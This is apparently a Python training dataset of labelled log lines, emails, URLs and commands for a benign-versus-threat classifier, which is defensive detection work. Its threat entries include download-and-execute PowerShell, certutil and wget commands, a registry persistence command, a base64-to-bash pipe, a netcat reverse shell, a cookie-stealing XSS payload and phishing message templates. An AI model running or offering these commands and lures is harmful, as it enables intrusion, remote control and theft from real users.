# dataset.py

TRAINING_DATA = [
    # ============================================================
    # BENIGN — System / Network Logs
    # ============================================================
    ("User admin logged in successfully from office IP 192.168.1.10", "Benign"),
    ("HTTP GET request to /index.html returned 200 OK", "Benign"),
    ("Database daily backup completed successfully without errors", "Benign"),
    ("System health check ping passed on port 8080", "Benign"),
    ("User updated profile picture via POST /api/user/settings", "Benign"),
    ("Cron job executed scheduled cleanup task in /tmp", "Benign"),
    ("TLS handshake succeeded with valid SSL certificate", "Benign"),
    ("Authorized API call to /v1/products with valid OAuth token", "Benign"),
    ("Single failed login attempt for user dev_team from home IP", "Benign"),
    ("High CPU usage spike detected on web worker node 02", "Benign"),
    ("Unknown user agent string 'Python-urllib/3.8' requesting public asset", "Benign"),
    ("Scheduled software update installed successfully on workstation 14", "Benign"),
    ("User password changed successfully after self-service reset", "Benign"),
    ("VPN connection established for remote employee from approved device", "Benign"),

    # ============================================================
    # BENIGN — Everyday emails / messages
    # ============================================================
    ("Hey! Here is the recipe for the cake we talked about yesterday: http://allrecipes.com/chocolate-cake", "Benign"),
    ("Your Amazon order #114-2938 has shipped and will arrive Tuesday", "Benign"),
    ("Reminder: team standup meeting today at 10am in the usual room", "Benign"),
    ("Thanks for the great presentation yesterday, really enjoyed it", "Benign"),
    ("Your monthly bank statement is now available to view online at your bank's official portal", "Benign"),
    ("Lunch tomorrow at the new Italian place? Let me know if you're free", "Benign"),
    ("Your flight booking confirmation for Delta Airlines flight DL1234 is attached", "Benign"),
    ("Newsletter: five new features added to our product this month", "Benign"),
    ("Can you review the attached document and send feedback by Friday", "Benign"),
    ("Happy birthday! Hope you have a wonderful day", "Benign"),

    # ============================================================
    # BENIGN — Normal URLs
    # ============================================================
    ("https://www.wikipedia.org/wiki/Machine_learning", "Benign"),
    ("https://github.com/pytorch/pytorch", "Benign"),
    ("https://www.nytimes.com/section/technology", "Benign"),
    ("https://accounts.google.com/signin", "Benign"),
    ("http://www.espn.com/nba/scores", "Benign"),

    # ============================================================
    # BENIGN — Normal commands
    # ============================================================
    ("pip install requests pandas numpy --upgrade", "Benign"),
    ("git clone https://github.com/user/repo.git", "Benign"),
    ("docker-compose up -d web database", "Benign"),
    ("npm install express cors dotenv", "Benign"),
    ("systemctl restart nginx.service", "Benign"),

    # ============================================================
    # THREAT — System / Network Logs
    # ============================================================
    ("CRITICAL: 50 failed SSH root login attempts in 5 seconds from unknown IP 45.33.22.11", "Threat"),
    ("ALERT: SQL Injection attack detected in URL parameter: SELECT * FROM users WHERE 1=1--", "Threat"),
    ("SECURITY WARNING: Unauthorized script /tmp/exploit.sh executed with root privileges", "Threat"),
    ("XSS payload detected in form input: <script>document.location='http://attacker.com/cookie'</script>", "Threat"),
    ("Phishing link clicked leading to credential harvesting domain auth-update-login.com", "Threat"),
    ("Ransomware activity detected: rapid file encryption in /usr/share/documents", "Threat"),
    ("Directory traversal attempt blocked: GET /../../../../etc/passwd", "Threat"),
    ("Reverse shell connection established to external IP 185.220.101.5:4444", "Threat"),
    ("Unusual outbound HTTP request on non-standard port 8443 with encrypted payload", "Threat"),
    ("Multiple internal network port sweeps detected across subnet 10.0.0.0/24", "Threat"),
    ("Brute force attack detected: 200 login attempts against admin panel in 1 minute", "Threat"),
    ("Privilege escalation attempt detected via sudo misconfiguration exploit", "Threat"),
    ("Data exfiltration alert: 500MB uploaded to unknown external FTP server", "Threat"),

    # ============================================================
    # THREAT — Phishing emails / messages
    # ============================================================
    ("URGENT: Your Netflix payment failed. Update your card details within 24 hours at http://netflix-billing-update-user.com or your account will be deleted.", "Threat"),
    ("Your account has been suspended. Verify your identity immediately by clicking this link and entering your password.", "Threat"),
    ("Dear customer, we detected unusual activity. Confirm your bank login now to avoid permanent suspension of your account.", "Threat"),
    ("Congratulations! You've won a $1000 gift card. Click here now to claim your prize before it expires.", "Threat"),
    ("IRS Final Notice: You owe back taxes. Pay immediately via gift card or face legal action.", "Threat"),
    ("Your PayPal account is limited. Login here to restore full access and confirm your payment information.", "Threat"),
    ("Security Alert: someone tried to sign into your Microsoft account. Click here to verify it was not you.", "Threat"),
    ("Your package could not be delivered. Pay a small customs fee here to reschedule delivery.", "Threat"),
    ("This is your CEO, I need you to urgently purchase gift cards and send me the codes, keep this confidential.", "Threat"),
    ("Your email storage is full. Click here and login to upgrade before your account is deactivated.", "Threat"),

    # ============================================================
    # THREAT — Malicious URLs
    # ============================================================
    ("http://www.google-security-verify-login.account-check.xyz/auth", "Threat"),
    ("http://paypal-account-secure-verification.tk/login.php", "Threat"),
    ("http://192.168.45.22/wp-admin/payload.exe", "Threat"),
    ("http://apple-id-locked-verify-now.support-case.ru/signin", "Threat"),
    ("http://bit.ly/3xQzXk9-claim-your-free-prize-now", "Threat"),
    ("http://microsoft365-secure-billing-update.info/account", "Threat"),

    # ============================================================
    # THREAT — Malicious commands / scripts
    # ============================================================
    ("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadFile('http://badsite.com/payload.exe', '$env:TEMP\\malware.exe'); Start-Process '$env:TEMP\\malware.exe'", "Threat"),
    ("certutil.exe -urlcache -split -f http://malicious-domain.com/payload.exe payload.exe", "Threat"),
    ("wget http://evil-server.net/backdoor.sh -O /tmp/x.sh && chmod +x /tmp/x.sh && /tmp/x.sh", "Threat"),
    ("cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\malware.exe", "Threat"),
    ("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://c2server.com/stager.ps1')", "Threat"),
    ("echo 'base64_encoded_payload' | base64 -d | bash", "Threat"),
    ("nc -e /bin/sh 185.220.101.5 4444", "Threat"),
]
